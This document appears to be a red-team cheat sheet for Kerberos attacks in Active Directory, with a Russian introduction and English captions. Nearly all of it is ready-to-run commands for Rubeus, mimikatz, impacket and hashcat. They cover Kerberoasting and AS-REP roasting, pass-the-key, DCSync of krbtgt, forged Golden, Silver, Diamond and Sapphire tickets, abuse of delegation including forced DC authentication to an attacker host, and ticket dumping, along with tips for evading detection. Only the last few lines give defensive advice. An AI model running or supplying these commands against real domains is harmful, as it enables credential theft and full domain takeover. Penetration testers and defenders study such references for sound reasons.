# Roasting, Tickets and Delegation

Справочные материалы по атакам на Kerberos: обнаружение SPN, Kerberoasting, AS-REP roasting, передача ключа (Pass-the-Key), поддельные тикеты, делегирование и работа с тикетами.

**Что такое атаки на Kerberos?**

Kerberos выполняет аутентификацию субъектов с помощью тикетов, выпущенных доверенным контроллером домена. Векторы атак возникают из-за слабых секретов учетных записей служб, отсутствия предварительной аутентификации, прав делегирования или компрометации ключей подписи тикетов. Перед интерпретацией результатов, связанных с тикетами или делегированием, проверьте соответствующие разрешения учетных записей и каталога.

Команды Windows выполняются в текущем сеансе входа в систему. Запросы к каталогу требуют наличия модуля ActiveDirectory для PowerShell и доступа к контроллеру домена.

SPN Discovery & Enumeration

No special privileges — any domain user can query SPNs


```
setspn -T domain.com -Q */*
```

User-account SPNs matter — machine accounts have 120-char random passwords


```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name,ServicePrincipalName
```

PowerView function — no Rubeus/binary needed

```
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
```

Drop -request to enumerate only; recon before noisy roasting

```
python3 GetUserSPNs.py domain.com/user:password -dc-ip <DC_IP>
```

UAC flag 0x400000 / DONT_REQ_PREAUTH

```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

Targets the userAccountControl pre-auth bit


```
Get-DomainUser -PreauthNotRequired -Verbose | Select samaccountname
```

TRUSTED_FOR_DELEGATION (UAC 0x80000) — high-value delegation targets


```
Get-DomainComputer -Unconstrained | Select dnshostname
```

msDS-AllowedToDelegateTo populated = constrained delegation


```
Get-DomainComputer -TrustedToAuth | Select dnshostname,msds-allowedtodelegateto
```

Service ticket is RC4/AES encrypted with the service account&#x27;s password hash


```
python3 GetUserSPNs.py domain.com/user:password -dc-ip <DC_IP> -request -outputfile kerb.hashes
```

Avoids requesting every SPN at once (less Event ID 4769 noise)


```
GetUserSPNs.py domain.com/user:password -request-user svc_sql -outputfile svc_sql.hash
```

/nowrap keeps the hash on one line for hashcat


```
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

Quieter than roasting the whole domain


```
Rubeus.exe kerberoast /user:svc_sql /domain:domain.com /nowrap
```

AES-encrypted tickets (mode 19700) crack far slower than RC4 (13100)


```
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap
```

Recon — see which accounts still allow RC4 before roasting


```
Rubeus.exe kerberoast /stats
```

$krb5tgs$23$ prefix = RC4


```
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
```

$krb5tgs$18$ = AES256, $krb5tgs$17$ = AES128


```
hashcat -m 19700 -a 0 hashes.txt rockyou.txt
```

No credentials needed — only a username list (DONT_REQ_PREAUTH accounts)


```
python3 GetNPUsers.py domain.com/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes
```

With valid creds, finds DONT_REQ_PREAUTH accounts itself


```
GetNPUsers.py domain.com/user:password -request -format hashcat -outputfile asrep.hashes
```

/format:hashcat outputs the $krb5asrep$ hash directly


```
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
```

Quieter; single Event ID 4768 for AS-REQ


```
Rubeus.exe asreproast /user:jsmith /format:hashcat /nowrap
```

$krb5asrep$23$ prefix


```
hashcat -m 18200 -a 0 asrep.hashes rockyou.txt
```

Requires GenericWrite/GenericAll over the target; remember to revert


```
Set-DomainObject -Identity jsmith -XOR @{useraccountcontrol=4194304} -Verbose
```

Uses RC4 etype — encrypts the AS-REQ timestamp with the NT hash


```
Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /domain:domain.com /ptt
```

Get AES keys from mimikatz sekurlsa::ekeys; /opsec mimics normal client behaviour


```
Rubeus.exe asktgt /user:Administrator /aes256:<AES256_KEY> /domain:domain.com /ptt /opsec
```

Linux equivalent of overpass-the-hash


```
python3 getTGT.py domain.com/Administrator -hashes :<NTLM_HASH> -dc-ip <DC_IP>
```

Pass-the-key — RC4-less, stealthier


```
python3 getTGT.py domain.com/Administrator -aesKey <AES256_KEY> -dc-ip <DC_IP>
```

Then run psexec.py -k -no-pass domain.com/Administrator@target


```
export KRB5CCNAME=Administrator.ccache
```

Prefer /aes256 over /ntlm to keep tickets AES-encrypted


```
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.com /aes256:<KEY> /run:powershell.exe
```

Requires Domain Admin / replication rights


```
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
```

Use /aes256:&lt;key&gt; instead of /krbtgt for AES; default lifetime is 10 years


```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:<NTLM> /id:500 /ptt
```

RC4 Golden Tickets trigger encryption-downgrade detections


```
Rubeus.exe golden /aes256:<KRBTGT_AES> /user:Administrator /id:500 /domain:domain.com /sid:S-1-5-21-... /ptt
```

Add -aesKey for AES; load with KRB5CCNAME=Administrator.ccache


```
python3 ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... -domain domain.com Administrator
```

Silver = service-scoped, no DC contact, far harder to detect than Golden


```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:<SID> /target:srv.domain.com /service:cifs /rc4:<MACHINE_NTLM> /ptt
```

Machine hash grants cifs/host/etc. on that single server


```
python3 ticketer.py -nthash <MACHINE_NTLM> -domain-sid <SID> -domain domain.com -spn cifs/srv.domain.com Administrator
```

More legitimate-looking than a Golden Ticket — uses a genuine AS-REQ


```
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /krbkey:<KRBTGT_AES> /ptt
```

Embeds an authentic privileged PAC — defeats PAC validation checks


```
Rubeus.exe golden /sapphire ... /user:lowpriv /service:krbtgt ...
```

On an unconstrained host, inbound TGTs land in LSASS — capture and reuse them


```
Rubeus.exe monitor /interval:5 /nowrap
```

Combine with Rubeus monitor to capture the DC&#x27;s TGT, then DCSync


```
SpoolSample.exe DC$ ATTACKER_UNCONSTRAINED_HOST
```

Account has msDS-AllowedToDelegateTo set; the SPN service part can be swapped


```
python3 getST.py -spn cifs/target.domain.com -impersonate Administrator -dc-ip <DC_IP> domain.com/svc_account:password
```

/altservice exploits the unenforced service-class field to reach ldap/host/etc.


```
Rubeus.exe s4u /user:svc_web /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /altservice:host,ldap /ptt
```

Needs GenericWrite/GenericAll over TARGET$; classic MachineAccountQuota abuse


```
Set-DomainComputer -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Create FAKE01$ first via addcomputer.py (MAQ default = 10)


```
python3 rbcd.py -delegate-from FAKE01$ -delegate-to TARGET$ -action write domain.com/user:password
```

FAKE01$ now trusted to delegate to TARGET$ — full takeover of that host


```
python3 getST.py -spn cifs/TARGET.domain.com -impersonate Administrator domain.com/FAKE01$:password
```

Default ms-DS-MachineAccountQuota lets any domain user add 10 computers


```
python3 addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Pass123' domain.com/user:password
```

Pass-the-Ticket — works for TGT or TGS


```
Rubeus.exe ptt /ticket:<base64_or_kirbi>
```

Requires elevation; export with /service or /luid filters


```
Rubeus.exe dump /service:krbtgt /nowrap
```

Recon — spot delegatable TGTs and high-value sessions


```
Rubeus.exe triage
```

Move tickets between Rubeus (Windows) and impacket (Linux) workflows


```
python3 ticketConverter.py ticket.kirbi ticket.ccache
```

Verify a PtT/OPtH before launching follow-on tooling


```
klist  /  kerberos::list (mimikatz)  /  klist (Linux)
```

RC4-only requests stand out; AES blends with legitimate traffic


```
Rubeus.exe asktgt /user:u /aes256:<KEY> /opsec /nopreauth ...
```

Single reset keeps the old key valid (N-1) — two resets are required


```
kgtgt rotation: reset krbtgt twice (with replication between resets)
```

Enforce AES-only and use long (25+ char) gMSA service-account passwords


```
Monitor Event ID 4769 (TGS request) with RC4 etype 0x17 from non-standard accounts
```
